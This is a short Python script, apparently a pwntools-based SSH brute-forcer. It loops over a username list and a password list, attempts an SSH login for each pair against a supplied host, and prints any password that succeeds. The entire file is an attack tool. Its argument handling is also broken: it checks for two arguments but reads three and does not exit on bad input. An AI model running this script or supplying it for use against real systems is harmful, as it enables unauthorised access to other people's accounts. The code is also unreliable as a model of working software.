from pwn import *
import paramiko 

if len(sys.argv) != 2:
    print("Invalid arguments")
    print("Usage: {} <host> <username file> <password file>".format(sys.argv[0]))


host = sys.argv[1]
usernames = sys.argv[2]
passwords = sys.argv[3]
attempts = 0


with open(usernames, "r") as usernames_list:
    with open(passwords, "r") as passwords_list:
        for username in usernames_list:
            print("Attempting with username {}".format(username))
            passwords_list.seek(0)
            username = username.strip("\n")
            for password in passwords_list:
                password = password.strip("\n")
                try:
                    print("[{}] Attempting password: '{}'!".format(attempts, password))
                    response = ssh(host=host, user=username, password=password, timeout=1) 
                    if response.connected():
                        print("[>] Valid password found: '{}'!".format(password))
                        response.close()
                        break

                except paramiko.ssh_exception.AuthenticationException:
                    print("[X] Invalid password!")
                attempts += 1